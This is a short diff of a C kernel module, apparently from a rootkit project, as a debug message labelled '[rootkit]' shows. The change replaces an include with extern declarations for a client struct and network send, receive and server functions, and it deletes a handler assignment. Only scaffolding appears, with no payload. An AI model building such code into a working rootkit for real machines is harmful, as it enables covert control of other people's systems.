@@ -1,8 +1,10 @@
 #include <linux/string.h>
 
-#include <networking.c>
+extern struct client_t client; //global variable holding  data associated with client for easy access by all functions
+extern int run_server(void *port); //creates the server
+extern int net_send(void); //sends data to the server
+extern int net_recv(void); //recieves data from server
 
-extern struct client_t client;
 static int client_handler(void){
 	printk(KERN_DEBUG "[rootkit] in client_handler");
 	if (client.message == NULL) { //if message is null
@@ -25,7 +27,6 @@ static int client_handler(void){
 	return 0; //return 0 for no errors
 }
 
-client.client_handler = client_handler;
 
 static int client_print(char *message){
 	/*
